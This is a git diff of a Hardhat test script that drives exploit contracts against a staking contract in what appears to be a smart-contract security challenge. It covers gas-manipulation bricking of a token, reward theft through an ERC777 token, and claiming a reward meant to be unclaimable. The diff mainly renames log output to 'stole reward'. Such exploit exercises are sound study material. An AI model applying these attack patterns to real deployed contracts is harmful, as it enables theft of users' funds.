@@ -1,6 +1,6 @@
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
-const { deploy1820 } = require("./utils/helpers.js");
+const { deploy1820, prettyEth } = require("./utils/helpers.js");
 
 async function deploy(deployer) {
     const rewards = await (
@@ -82,18 +82,16 @@ async function main() {
         return result;
     })();
 
-    console.log("running attack");
     const gasDeficit = 10_000; // determined by experimentation
     await attack.attackOne(stakableExpensive.address, unstakeGas.sub(gasDeficit));
 
-    console.log("checking attack");
     await expect(
         staking.connect(user).stake(stakableExpensive.address, ethers.utils.parseEther("1", "ether"))
     ).to.be.revertedWith("Staking2: badly-behaved token");
     await expect(
         staking.connect(user).unstake(stakableExpensive.address, ethers.utils.parseEther("1", "ether"))
     ).to.be.revertedWith("Staking2: badly-behaved token");
-    console.log("token is bricked!");
+    console.log("token is labeled badly-behaved!");
 
     // ------------------------------------------------------------------------
 
@@ -101,21 +99,15 @@ async function main() {
     const beforeBalanceReward = await rewards.balanceOf(attack.address);
     const beforeBalanceStake = await stakable777.balanceOf(attack.address);
     await attack.attackTwo(stakable777.address);
-    console.log(
-        "reward profit/loss: %s",
-        ethers.utils.formatEther((await rewards.balanceOf(attack.address)).sub(beforeBalanceReward))
-    );
-    console.log(
-        "stake profit/loss: %s",
-        ethers.utils.formatEther((await stakable777.balanceOf(attack.address)).sub(beforeBalanceStake))
-    );
+    console.log("stole reward: %s", prettyEth((await rewards.balanceOf(attack.address)).sub(beforeBalanceReward)));
 
     // ------------------------------------------------------------------------
 
     console.log("\n CHALLENGE - 5C\n");
 
     // This reward should never be claimable. We'll claim it below.
-    await staking.connect(rewarder).addReward(ethers.constants.AddressZero, ethers.utils.parseEther("50", "ether"));
+    const unclaimableReward = ethers.utils.parseEther("50", "ether");
+    await staking.connect(rewarder).addReward(ethers.constants.AddressZero, unclaimableReward);
 
     await staking.connect(attacker).stake(stakableNormal.address, ethers.utils.parseEther("5", "ether"));
     await staking.connect(attacker2).stake(stakableNormal.address, ethers.utils.parseEther("5", "ether"));
@@ -125,8 +117,8 @@ async function main() {
     const totalReward = (await rewards.connect(attacker).balanceOf(attacker.address)).add(
         await rewards.connect(attacker2).balanceOf(attacker2.address)
     );
-    await expect(totalReward).to.be.above(ethers.utils.parseEther("50", "ether"));
-    console.log("excess reward: %s", ethers.utils.formatEther(totalReward.sub(ethers.utils.parseEther("50", "ether"))));
+    await expect(totalReward).to.be.above(unclaimableReward);
+    console.log("stole reward: %s", prettyEth(totalReward.sub(unclaimableReward)));
 }
 
 main()
